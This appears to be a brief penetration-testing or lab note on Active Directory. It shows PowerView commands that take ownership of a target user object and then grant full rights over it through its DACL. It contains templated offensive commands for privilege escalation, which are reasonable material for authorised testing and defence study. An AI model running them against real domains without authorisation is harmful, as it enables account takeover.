#### Setting the Object Owner with `PowerView`
```powershell
Set-DomainObjectOwner -Identity <TARGET-USER> -OwnerIdentity <USER> -Verbose
```
![[Pasted image 20251230154716.png]]
#### Modifying TARGET-USER's DACL
```powershell
Add-DomainObjectAcl -TargetIdentity <TARGET-USER> -PrincipalIdentity <USER> -Rights All -Verbose
```
![[Pasted image 20251230154819.png]]
Now we have all rights on the user

